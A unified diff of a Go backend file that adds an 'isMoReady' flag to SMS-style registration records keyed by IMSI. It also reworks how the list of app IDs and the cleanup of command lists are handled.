@@ -335,13 +335,18 @@ func chooseRegisterContent(user map[string]string) string {
 				needCmd := false
 				if userRecordMap[v["apid"]] == nil {
 					needCmd = true
-					go insertRelation(user, v["apid"])
+					go insertRelation(user, v)
 				} else if strings.EqualFold(userRecordMap[v["apid"]]["successCount"], "0") {
 					needCmd = true
-					go updateRelation(userRecordMap[v["apid"]])
+					go updateRelation(userRecordMap[v["apid"]], v)
 				}
 				if needCmd {
 					result = strings.Replace(result, "[command-"+strconv.Itoa(appCount)+"]", "<data><kno>"+v["portNumber"]+"</kno><kw>"+v["keyword"]+"</kw><apid>"+v["apid"]+"</apid></data>", -1)
+					if strings.EqualFold(appList, "") {
+						appList = "," + v["apid"] + ","
+					} else {
+						appList += v["apid"] + ","
+					}
 					appCount++
 				}
 			} else {
@@ -361,11 +366,15 @@ func chooseRegisterContent(user map[string]string) string {
 	if appCount > 0 {
 		if !strings.EqualFold(appList, "") {
 			go processRegisterUser(user, appList)
+		} else {
+			go cleanRegisterUserCmdList(user)
 		}
-	}
-	if strings.Index(appList, ",4,") == -1 && strings.Index(appList, ",5,") == -1 {
+	} else {
 		go cleanRegisterUserCmdList(user)
 	}
+	// if strings.Index(appList, ",4,") == -1 && strings.Index(appList, ",5,") == -1 {
+	// 	go cleanRegisterUserCmdList(user)
+	// }
 	return result
 }
 
@@ -425,7 +434,7 @@ func checkNotVirtualMobile(mobile string) bool {
 	}
 }
 
-func insertRelation(user map[string]string, apid string) {
+func insertRelation(user map[string]string, target map[string]string) {
 	defer func() {
 		if err := recover(); err != nil {
 			log.Println("error begin:")
@@ -433,11 +442,15 @@ func insertRelation(user map[string]string, apid string) {
 			log.Println("error end:")
 		}
 	}()
-	sql := `insert into register_user_relations (imsi,apid,getTime) values (?,?,?)`
-	insert(dbConfig, sql, user["imsi"], apid, time.Now().Unix())
+	sql := `insert into register_user_relations (imsi,apid,getTime,isMoReady) values (?,?,?,?)`
+	isMoReady := "1"
+	if target["isNeedMo"] == "1" {
+		isMoReady = "0"
+	}
+	insert(dbConfig, sql, user["imsi"], target["apid"], time.Now().Unix(), isMoReady)
 }
 
-func updateRelation(relation map[string]string) {
+func updateRelation(relation map[string]string, target map[string]string) {
 	defer func() {
 		if err := recover(); err != nil {
 			log.Println("error begin:")
@@ -445,16 +458,20 @@ func updateRelation(relation map[string]string) {
 			log.Println("error end:")
 		}
 	}()
+	isMoReady := "1"
+	if target["isNeedMo"] == "1" {
+		isMoReady = "0"
+	}
 	if len([]rune(relation["fetchTime"])) > 4 {
 		_fetchTime, _ := strconv.ParseInt(relation["fetchTime"], 10, 64)
 		if time.Now().Unix()-_fetchTime > 86400 {
-			sql := `update register_user_relations set getTime = ? , registerChannelId = null  where id =?`
-			exec(dbConfig, sql, time.Now().Unix(), relation["id"])
+			sql := `update register_user_relations set getTime = ? , registerChannelId = null , isMoReady=?  where id =?`
+			exec(dbConfig, sql, time.Now().Unix(), isMoReady, relation["id"])
 			return
 		}
 	}
-	sql := `update register_user_relations set getTime = ? where id =?`
-	exec(dbConfig, sql, time.Now().Unix(), relation["id"])
+	sql := `update register_user_relations set getTime = ?, isMoReady=? where id =?`
+	exec(dbConfig, sql, time.Now().Unix(), isMoReady, relation["id"])
 }
 
 func updateRelationSetGetTimeZero(relation map[string]string) {
